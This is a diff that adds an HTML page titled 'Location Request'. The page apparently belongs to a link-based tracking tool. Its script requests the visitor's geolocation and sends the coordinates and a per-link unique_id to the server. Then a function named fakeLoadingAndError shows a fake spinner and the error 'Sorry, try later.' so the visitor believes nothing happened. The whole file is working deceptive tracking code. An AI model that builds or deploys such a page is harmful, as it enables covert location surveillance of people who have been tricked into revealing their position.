@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Location Request</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #f4f6fb;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .card {
+            background: #fff;
+            margin-top: 90px;
+            padding: 38px 30px 32px 30px;
+            border-radius: 16px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        .main-text {
+            color: #2d3748;
+            font-size: 1.3rem;
+            margin-bottom: 18px;
+        }
+        .loading {
+            display: none;
+            margin: 18px auto 0 auto;
+        }
+        .spinner {
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid #3182ce;
+            border-radius: 50%;
+            width: 38px;
+            height: 38px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 12px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #4a5568;
+            font-size: 1.08rem;
+        }
+        .error {
+            display: none;
+            color: #e53e3e;
+            background: #fff5f5;
+            border: 1px solid #fed7d7;
+            border-radius: 8px;
+            padding: 14px 10px;
+            margin-top: 18px;
+            font-size: 1.08rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="main-text" id="main-text">
+            <span style="font-size:1.2rem;">Requesting your location...</span>
+            <div id="allow-location-msg" style="margin-top:14px;color:#3182ce;font-size:1.05rem;display:block;">
+                <span style="font-size:1.6rem;vertical-align:middle;">📍</span>
+                Please allow location access when prompted.
+            </div>
+        </div>
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <div class="loading-text">Loading... Please wait.</div>
+        </div>
+        <div class="error" id="error">Sorry, try later.</div>
+
+    </div>
+    <script>
+        function fakeLoadingAndError() {
+            document.getElementById('main-text').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            setTimeout(function() {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('error').style.display = 'block';
+            }, 2500);
+        }
+
+        function sendLocation(lat, lon) {
+            fetch('/submit_location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon,
+                    unique_id: '{{ unique_id }}'
+                })
+            }).then(function() {
+                fakeLoadingAndError();
+            });
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                sendLocation(position.coords.latitude, position.coords.longitude);
+            }, function(error) {
+                // Permission denied or unavailable
+                fakeLoadingAndError();
+            });
+        } else {
+            fakeLoadingAndError();
+        }
+    </script>
+</body>
+</html>
